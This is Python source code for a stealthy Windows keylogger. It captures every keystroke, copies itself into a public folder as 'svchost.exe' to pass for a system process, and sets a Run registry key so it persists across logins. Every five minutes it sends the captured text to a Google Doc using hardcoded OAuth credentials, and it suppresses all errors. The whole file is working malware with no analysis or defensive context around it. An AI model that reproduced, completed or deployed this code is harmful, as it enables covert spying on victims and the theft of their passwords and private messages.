from pynput import keyboard
import time
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
import winreg
import os
import sys
import shutil

# Hardcoded credentials
DOC_ID = "your-doc-id"
CLIENT_ID = "your-client-id"
CLIENT_SECRET = "your-client-secret"
ACCESS_TOKEN = "your-access-token"
REFRESH_TOKEN = "your-refresh-token"
TOKEN_URI = "https://oauth2.googleapis.com/token"
SCOPES = ["https://www.googleapis.com/auth/documents"]

log = ""

# Get the directory of the script/exe
if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

TARGET_DIR = r"C:\Users\Public\TempService"
TARGET_PATH = os.path.join(TARGET_DIR, "svchost.exe")

def copy_to_target():
    try:
        if not os.path.exists(TARGET_DIR):
            os.makedirs(TARGET_DIR)
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if current_exe != TARGET_PATH:
            shutil.copy2(current_exe, TARGET_PATH)
    except Exception as e:
        pass

def add_to_startup():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "TempService", 0, winreg.REG_SZ, TARGET_PATH)
        winreg.CloseKey(reg_key)
    except Exception as e:
        pass

copy_to_target()
add_to_startup()

# Load credentials
creds = Credentials(
    token=ACCESS_TOKEN,
    refresh_token=REFRESH_TOKEN,
    token_uri=TOKEN_URI,
    client_id=CLIENT_ID,
    client_secret=CLIENT_SECRET,
    scopes=SCOPES
)

service = build("docs", "v1", credentials=creds)

def on_press(key):
    global log
    try:
        if key.char.isprintable():
            log += key.char
    except AttributeError:
        if key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.space:
            log += " "

def update_doc():
    global log
    if log:
        requests = [{"insertText": {"location": {"index": 1}, "text": log}}]
        try:
            service.documents().batchUpdate(documentId=DOC_ID, body={"requests": requests}).execute()
            log = ""
        except Exception as e:
            pass 

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    time.sleep(300) 
    update_doc()